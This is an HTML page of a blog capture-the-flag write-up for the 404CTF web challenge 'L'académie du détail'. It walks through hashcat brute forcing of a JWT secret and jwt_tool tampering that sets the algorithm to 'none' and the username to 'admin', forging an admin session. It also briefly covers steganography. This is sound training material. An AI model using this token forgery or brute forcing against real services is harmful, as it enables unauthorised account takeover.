<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>404CTF : L'académie du détail | Sanlokii</title>
<meta name=keywords content="Web,Write-up"><meta name=description content="Web - Easy"><meta name=author content><link rel=canonical href=https://sanlokii.eu/writeups/404ctf/academie-du-detail/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://sanlokii.eu/assets/images/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sanlokii.eu/assets/images/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sanlokii.eu/assets/imagesfavicon-32x32.png><link rel=apple-touch-icon href=https://sanlokii.eu/assets/images/apple-touch-icon.png><link rel=mask-icon href=https://sanlokii.eu/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://sanlokii.eu/writeups/404ctf/academie-du-detail/><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="404CTF : L'académie du détail"><meta property="og:description" content="Web - Easy"><meta property="og:type" content="article"><meta property="og:url" content="https://sanlokii.eu/writeups/404ctf/academie-du-detail/"><meta property="og:image" content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2023-06-05T00:00:00+00:00"><meta property="article:modified_time" content="2023-06-05T00:00:00+00:00"><meta property="og:site_name" content="Sanlokii's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://sanlokii.eu/assets/images/yggdrasil_circle.png"><meta name=twitter:title content="404CTF : L'académie du détail"><meta name=twitter:description content="Web - Easy"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Writeups","item":"https://sanlokii.eu/writeups/"},{"@type":"ListItem","position":2,"name":"404CTF : L'académie du détail","item":"https://sanlokii.eu/writeups/404ctf/academie-du-detail/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"404CTF : L'académie du détail","name":"404CTF : L\u0027académie du détail","description":"Web - Easy","keywords":["Web","Write-up"],"articleBody":"Statement:\nWith your nose immersed in your black coffee, you take a quick look at the front page of the newspaper. One of the headlines catches your eye:\nMarch 1980: The opaque secret of the new member of the French Academy.\nYou scan the paper for the article in question. It states :\nAfter hours of deliberation, the Academicians have finally voted for the new member of the great French Academy. But for reasons unknown to everyone, his name has remained a secret ever since. Despite all their efforts, not a single journalist has managed to get even the slightest hint or picture.\nPuzzled, you realize that the French Academy has its own website. Perhaps the answer is finally within everyone’s grasp!\nAll the information you need to solve this challenge is provided in the statement above.\nWhen I go to the website, I see that it contains a login page.\nI start with a fairly basic user enum and see that the admin account exists : I saw a list of words in the footer of the site and thought they might be useful in solving the challenge : I’m trying to perform a bruteforce dictionary attack via this list on the admin password, but nothing is conclusive : I continue to recon the site and notice that when I log in with a random user, a JWT token is generated :\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTY1NjIyfQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE I decide to try a bruteforce attack on the secret HMAC via hashcat with the same wordlist :\nhashcat -a 0 -m 16500 \"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTY1NjIyfQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE\" wordlist.txt Session..........: hashcat Status...........: Exhausted Hash.Mode........: 16500 (JWT (JSON Web Token)) Hash.Target......: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI...rzohGE Time.Started.....: Sat May 13 09:34:52 2023 (0 secs) Time.Estimated...: Sat May 13 09:34:52 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (wordlist.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 665.7 kH/s (0.06ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered........: 0/1 (0.00%) Digests Progress.........: 250/250 (100.00%) Rejected.........: 0/250 (0.00%) Restore.Point....: 250/250 (100.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: PICASER -\u003e ENDEVEE Hardware.Mon.#1..: Temp: 73c Util: 18% Started: Sat May 13 09:34:52 2023 Stopped: Sat May 13 09:34:54 2023 Still not the right method, I conclude that the wordlist won’t be of much use to me.\nAt this point, I focus on the JWT token and I start by inspecting its contents :\npython jwt_tool.py \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4eCIsImV4cCI6MTY4MzkzNzg1NH0.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE\" \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.6 \\______| @ticarpi Original JWT: ===================== Decoded Token Values: ===================== Token header values: [+] alg = \"HS256\" [+] typ = \"JWT\" Token payload values: [+] username = \"xxx\" [+] exp = 1683937854 ==\u003e TIMESTAMP = 2023-05-13 02:30:54 (UTC) ---------------------- JWT common timestamps: iat = IssuedAt exp = Expires nbf = NotBefore ---------------------- I’m going to alter several token values :\nHS256 algorithm to none (CVE-2015-9235) username ‘xxx’ to ‘admin python jwt_tool.py \"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Inh4eCIsImV4cCI6MTY4MzkzNzg1NH0.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE\" -T \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.6 \\______| @ticarpi Original JWT: ==================================================================== This option allows you to tamper with the header, contents and signature of the JWT. ==================================================================== Token header values: [1] alg = \"HS256\" [2] typ = \"JWT\" [3] *ADD A VALUE* [4] *DELETE A VALUE* [0] Continue to next step Please select a field number: (or 0 to Continue) \u003e 1 Current value of alg is: HS256 Please enter new value and hit ENTER \u003e none [1] alg = \"none\" [2] typ = \"JWT\" [3] *ADD A VALUE* [4] *DELETE A VALUE* [0] Continue to next step Please select a field number: (or 0 to Continue) \u003e 0 Token payload values: [1] username = \"xxx\" [2] exp = 1683937854 ==\u003e TIMESTAMP = 2023-05-13 02:30:54 (UTC) [3] *ADD A VALUE* [4] *DELETE A VALUE* [5] *UPDATE TIMESTAMPS* [0] Continue to next step Please select a field number: (or 0 to Continue) \u003e 1 Current value of username is: xxx Please enter new value and hit ENTER \u003e admin [1] username = \"admin\" [2] exp = 1683937854 ==\u003e TIMESTAMP = 2023-05-13 02:30:54 (UTC) [3] *ADD A VALUE* [4] *DELETE A VALUE* [5] *UPDATE TIMESTAMPS* [0] Continue to next step Please select a field number: (or 0 to Continue) \u003e 0 Signature unchanged - no signing method specified (-S or -X) jwttool_3e4a8fe4d384fc63a3837c6f7790c25e - Tampered token: [+] eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTM3ODU0fQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE JWT tampered token value :\npython jwt_tool.py \"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTM3ODU0fQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE\" \\ \\ \\ \\ \\ \\ \\__ | | \\ |\\__ __| \\__ __| | | | \\ | | | \\ \\ | | \\ | | | __ \\ __ \\ | \\ | _ | | | | | | | | | | / \\ | | | | | | | | \\ | / \\ | | |\\ |\\ | | \\______/ \\__/ \\__| \\__| \\__| \\______/ \\______/ \\__| Version 2.2.6 \\______| @ticarpi Original JWT: ===================== Decoded Token Values: ===================== Token header values: [+] alg = \"none\" [+] typ = \"JWT\" Token payload values: [+] username = \"admin\" [+] exp = 1683937854 ==\u003e TIMESTAMP = 2023-05-13 02:30:54 (UTC) ---------------------- JWT common timestamps: iat = IssuedAt exp = Expires nbf = NotBefore ---------------------- All I have to do now is modify my token with the tampered JWT to access the admin account : Flag: 404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}\nBonus : At the start of the CTF, once authenticated with the admin account, there was a steganography step which was later removed as it didn’t add anything to the challenge.\nzsteg marguerite.png b1,r,lsb,xy .. text: \"C1y]E\\\\E{\" b1,rgb,lsb,xy .. text: \"404CTF{JWT_M41_1MP13M3N73_=L35_Pr0813M35}\" b1,bgr,lsb,xy .. file: OpenPGP Secret Key b2,r,msb,xy .. text: \"TD@TTADDD\" b2,g,msb,xy .. text: \"TD@TTADDD\" b2,b,msb,xy .. text: \"TD@TTADDD\" b4,r,msb,xy .. text: \"pb 7drB%R\" b4,g,lsb,xy .. file: MacBinary, Mon Feb 6 07:28:16 2040 INVALID date, modified Mon Feb 6 07:28:16 2040, creator ' ' \"\\340\\020\\020\\020\\020\\001\\021\\020\" b4,g,msb,xy .. text: \"pb 7drB%R\" b4,b,msb,xy .. text: \"pb 7drB%R\" b4,bgr,lsb,xy .. file: 0420 Alliant virtual executable not stripped ","wordCount":"1090","inLanguage":"en","datePublished":"2023-06-05T00:00:00Z","dateModified":"2023-06-05T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://sanlokii.eu/writeups/404ctf/academie-du-detail/"},"publisher":{"@type":"Organization","name":"Sanlokii","logo":{"@type":"ImageObject","url":"https://sanlokii.eu/assets/images/favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href=https://sanlokii.eu/ accesskey=h title="Sanlokii (Alt + H)"><img src=https://sanlokii.eu/assets/images/apple-touch-icon.png alt aria-label=logo height=40>Sanlokii</a><div class=logo-switches><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://sanlokii.eu/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://sanlokii.eu/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://sanlokii.eu/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sanlokii.eu/>Home</a>&nbsp;»&nbsp;<a href=https://sanlokii.eu/writeups/>Writeups</a></div><h1 class="post-title entry-hint-parent">404CTF : L'académie du détail</h1><div class=post-description>Web - Easy</div><div class=post-meta><span title='2023-06-05 00:00:00 +0000 UTC'>June 5, 2023</span></div></header><div class=post-content><p><strong>Statement:</strong></p><p>With your nose immersed in your black coffee, you take a quick look at the front page of the newspaper. One of the headlines catches your eye:</p><blockquote><p>March 1980: The opaque secret of the new member of the French Academy.</p></blockquote><p>You scan the paper for the article in question. It states :</p><blockquote><p>After hours of deliberation, the Academicians have finally voted for the new member of the great French Academy. But for reasons unknown to everyone, his name has remained a secret ever since. Despite all their efforts, not a single journalist has managed to get even the slightest hint or picture.</p></blockquote><p>Puzzled, you realize that the French Academy has its own website. Perhaps the answer is finally within everyone&rsquo;s grasp!</p><p>All the information you need to solve this challenge is provided in the statement above.</p><hr><p>When I go to the website, I see that it contains a login page.</p><p>I start with a fairly basic user enum and see that the admin account exists :
<img loading=lazy src=/assets/images/writeups/404_academie.png#center alt=academie></p><p>I saw a list of words in the footer of the site and thought they might be useful in solving the challenge :
<img loading=lazy src=/assets/images/writeups/404_academie1.png#center alt=academie1></p><p>I&rsquo;m trying to perform a bruteforce dictionary attack via this list on the admin password, but nothing is conclusive :
<img loading=lazy src=/assets/images/writeups/404_academie2.png#center alt=academie2></p><p>I continue to recon the site and notice that when I log in with a random user, a JWT token is generated :</p><pre tabindex=0><code class=language-jwt data-lang=jwt>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTY1NjIyfQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE
</code></pre><p>I decide to try a bruteforce attack on the secret HMAC via hashcat with the same wordlist :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>hashcat -a <span style=color:#ae81ff>0</span> -m <span style=color:#ae81ff>16500</span> <span style=color:#e6db74>&#34;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTY1NjIyfQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE&#34;</span> wordlist.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Session..........: hashcat                                
</span></span><span style=display:flex><span>Status...........: Exhausted
</span></span><span style=display:flex><span>Hash.Mode........: <span style=color:#ae81ff>16500</span> <span style=color:#f92672>(</span>JWT <span style=color:#f92672>(</span>JSON Web Token<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>Hash.Target......: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI...rzohGE
</span></span><span style=display:flex><span>Time.Started.....: Sat May <span style=color:#ae81ff>13</span> 09:34:52 <span style=color:#ae81ff>2023</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Time.Estimated...: Sat May <span style=color:#ae81ff>13</span> 09:34:52 <span style=color:#ae81ff>2023</span> <span style=color:#f92672>(</span><span style=color:#ae81ff>0</span> secs<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Kernel.Feature...: Pure Kernel
</span></span><span style=display:flex><span>Guess.Base.......: File <span style=color:#f92672>(</span>wordlist.txt<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Guess.Queue......: 1/1 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Speed.#1.........:   665.7 kH/s <span style=color:#f92672>(</span>0.06ms<span style=color:#f92672>)</span> @ Accel:1024 Loops:1 Thr:1 Vec:8
</span></span><span style=display:flex><span>Recovered........: 0/1 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span> Digests
</span></span><span style=display:flex><span>Progress.........: 250/250 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Rejected.........: 0/250 <span style=color:#f92672>(</span>0.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Point....: 250/250 <span style=color:#f92672>(</span>100.00%<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
</span></span><span style=display:flex><span>Candidate.Engine.: Device Generator
</span></span><span style=display:flex><span>Candidates.#1....: PICASER -&gt; ENDEVEE
</span></span><span style=display:flex><span>Hardware.Mon.#1..: Temp: 73c Util: 18%
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Started: Sat May <span style=color:#ae81ff>13</span> 09:34:52 <span style=color:#ae81ff>2023</span>
</span></span><span style=display:flex><span>Stopped: Sat May <span style=color:#ae81ff>13</span> 09:34:54 <span style=color:#ae81ff>2023</span>
</span></span></code></pre></div><p>Still not the right method, I conclude that the wordlist won&rsquo;t be of much use to me.</p><p>At this point, I focus on the JWT token and I start by inspecting its contents :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python jwt_tool.py <span style=color:#e6db74>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Inh4eCIsImV4cCI6MTY4MzkzNzg1NH0.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>\ </span>  <span style=color:#ae81ff>\ </span>       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>         <span style=color:#ae81ff>\ </span>                   <span style=color:#ae81ff>\ </span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>\_</span>_   |   |  <span style=color:#ae81ff>\ </span>    |<span style=color:#ae81ff>\_</span>_    __| <span style=color:#ae81ff>\_</span>_    __|                    |
</span></span><span style=display:flex><span>         |   |   <span style=color:#ae81ff>\ </span>   |      |          |       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>    |
</span></span><span style=display:flex><span>         |        <span style=color:#ae81ff>\ </span>  |      |          |    __  <span style=color:#ae81ff>\ </span>    __  <span style=color:#ae81ff>\ </span>   |
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>\ </span>     |      _     |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span>   |     |     / <span style=color:#ae81ff>\ </span>   |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span><span style=color:#ae81ff>\ </span>       |    /   <span style=color:#ae81ff>\ </span>  |      |          |<span style=color:#ae81ff>\ </span>       |<span style=color:#ae81ff>\ </span>       |   |
</span></span><span style=display:flex><span> <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_/     <span style=color:#ae81ff>\_</span>_|   <span style=color:#ae81ff>\_</span>_|      <span style=color:#ae81ff>\_</span>_| <span style=color:#ae81ff>\_</span>_____/  <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_|
</span></span><span style=display:flex><span> Version 2.2.6                <span style=color:#ae81ff>\_</span>_____|             @ticarpi      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Original JWT: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>Decoded Token Values:
</span></span><span style=display:flex><span><span style=color:#f92672>=====================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token header values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> alg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;HS256&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> typ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token payload values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;xxx&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> exp <span style=color:#f92672>=</span> 1683937854    <span style=color:#f92672>==</span>&gt; TIMESTAMP <span style=color:#f92672>=</span> 2023-05-13 02:30:54 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>JWT common timestamps:
</span></span><span style=display:flex><span>iat <span style=color:#f92672>=</span> IssuedAt
</span></span><span style=display:flex><span>exp <span style=color:#f92672>=</span> Expires
</span></span><span style=display:flex><span>nbf <span style=color:#f92672>=</span> NotBefore
</span></span><span style=display:flex><span>----------------------
</span></span></code></pre></div><p>I&rsquo;m going to alter several token values :</p><ul><li>HS256 algorithm to none (CVE-2015-9235)</li><li>username &lsquo;xxx&rsquo; to &lsquo;admin</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python jwt_tool.py <span style=color:#e6db74>&#34;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6Inh4eCIsImV4cCI6MTY4MzkzNzg1NH0.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE&#34;</span> -T
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>\ </span>  <span style=color:#ae81ff>\ </span>       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>         <span style=color:#ae81ff>\ </span>                   <span style=color:#ae81ff>\ </span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>\_</span>_   |   |  <span style=color:#ae81ff>\ </span>    |<span style=color:#ae81ff>\_</span>_    __| <span style=color:#ae81ff>\_</span>_    __|                    |
</span></span><span style=display:flex><span>         |   |   <span style=color:#ae81ff>\ </span>   |      |          |       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>    |
</span></span><span style=display:flex><span>         |        <span style=color:#ae81ff>\ </span>  |      |          |    __  <span style=color:#ae81ff>\ </span>    __  <span style=color:#ae81ff>\ </span>   |
</span></span><span style=display:flex><span>  <span style=color:#ae81ff>\ </span>     |      _     |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span>   |     |     / <span style=color:#ae81ff>\ </span>   |      |          |   |     |   |     |   |
</span></span><span style=display:flex><span><span style=color:#ae81ff>\ </span>       |    /   <span style=color:#ae81ff>\ </span>  |      |          |<span style=color:#ae81ff>\ </span>       |<span style=color:#ae81ff>\ </span>       |   |
</span></span><span style=display:flex><span> <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_/     <span style=color:#ae81ff>\_</span>_|   <span style=color:#ae81ff>\_</span>_|      <span style=color:#ae81ff>\_</span>_| <span style=color:#ae81ff>\_</span>_____/  <span style=color:#ae81ff>\_</span>_____/ <span style=color:#ae81ff>\_</span>_|
</span></span><span style=display:flex><span> Version 2.2.6                <span style=color:#ae81ff>\_</span>_____|             @ticarpi      
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Original JWT: 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================</span>
</span></span><span style=display:flex><span>This option allows you to tamper with the header, contents and 
</span></span><span style=display:flex><span>signature of the JWT.
</span></span><span style=display:flex><span><span style=color:#f92672>====================================================================</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token header values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> alg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;HS256&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> typ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> *ADD A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> *DELETE A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> Continue to next step
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please <span style=color:#66d9ef>select</span> a field number:
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>or <span style=color:#ae81ff>0</span> to Continue<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Current value of alg is: HS256
</span></span><span style=display:flex><span>Please enter new value and hit ENTER
</span></span><span style=display:flex><span>&gt; none
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> alg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;none&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> typ <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;JWT&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> *ADD A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> *DELETE A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> Continue to next step
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please <span style=color:#66d9ef>select</span> a field number:
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>or <span style=color:#ae81ff>0</span> to Continue<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Token payload values:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;xxx&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> exp <span style=color:#f92672>=</span> 1683937854    <span style=color:#f92672>==</span>&gt; TIMESTAMP <span style=color:#f92672>=</span> 2023-05-13 02:30:54 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> *ADD A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> *DELETE A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>5<span style=color:#f92672>]</span> *UPDATE TIMESTAMPS*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> Continue to next step
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please <span style=color:#66d9ef>select</span> a field number:
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>or <span style=color:#ae81ff>0</span> to Continue<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Current value of username is: xxx
</span></span><span style=display:flex><span>Please enter new value and hit ENTER
</span></span><span style=display:flex><span>&gt; admin
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>1<span style=color:#f92672>]</span> username <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;admin&#34;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>2<span style=color:#f92672>]</span> exp <span style=color:#f92672>=</span> 1683937854    <span style=color:#f92672>==</span>&gt; TIMESTAMP <span style=color:#f92672>=</span> 2023-05-13 02:30:54 <span style=color:#f92672>(</span>UTC<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>3<span style=color:#f92672>]</span> *ADD A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>4<span style=color:#f92672>]</span> *DELETE A VALUE*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>5<span style=color:#f92672>]</span> *UPDATE TIMESTAMPS*
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>0<span style=color:#f92672>]</span> Continue to next step
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Please <span style=color:#66d9ef>select</span> a field number:
</span></span><span style=display:flex><span><span style=color:#f92672>(</span>or <span style=color:#ae81ff>0</span> to Continue<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>&gt; <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Signature unchanged - no signing method specified <span style=color:#f92672>(</span>-S or -X<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>jwttool_3e4a8fe4d384fc63a3837c6f7790c25e - Tampered token:
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTM3ODU0fQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE
</span></span></code></pre></div><p>JWT tampered token value :</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>python jwt_tool.py <span style=color:#e6db74>&#34;eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjgzOTM3ODU0fQ.cN-qlPPwzt_4eaC7M05Lv5qPZo69gTC9nU-ZKrzohGE&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#ae81ff>\ </span>  <span style=color:#ae81ff>\ </span>       <span style=color:#ae81ff>\ </span>        <span style=color:#ae81ff>\ </span>         <span style=color:#ae81ff>\ </span>                   <span style=color:#ae81ff>\ </span>
</span></span><span style=display:flex><span>   <span style=color:#ae81ff>\_</span>_   |   |  <span style=color:#ae81ff>\ </span>    |<span style=color:#ae81ff>\_</span>_    __| <span style=color:#ae81ff>\_</span>_    __|                    |
